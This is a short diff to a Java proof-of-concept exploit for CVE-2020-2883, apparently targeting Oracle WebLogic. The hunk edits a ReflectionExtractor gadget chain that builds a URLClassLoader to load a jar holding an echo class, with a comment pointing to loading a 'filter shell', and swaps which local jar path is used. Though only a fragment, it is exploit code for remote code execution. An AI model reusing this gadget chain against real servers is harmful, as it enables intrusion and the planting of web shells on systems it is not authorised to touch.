@@ -24,7 +24,8 @@ public class CVE_2020_2883_URLClassLoader {
             // this jar is result of `jar cvf a.jar WebLogicEcho.class`
             ReflectionExtractor extractor2 = new ReflectionExtractor(
                     "newInstance",
-                    new Object[]{new Object[]{new URL[]{new URL("file:///C:/Users/Administrator/Desktop/a.jar")}}}
+//                    new Object[]{new Object[]{new URL[]{new URL("file:///tmp/tttt.jar")}}}
+                    new Object[]{new Object[]{new URL[]{new URL("file:///C:/Users/Administrator/Desktop/tttt.jar")}}}
             );
 
             // load filter shell
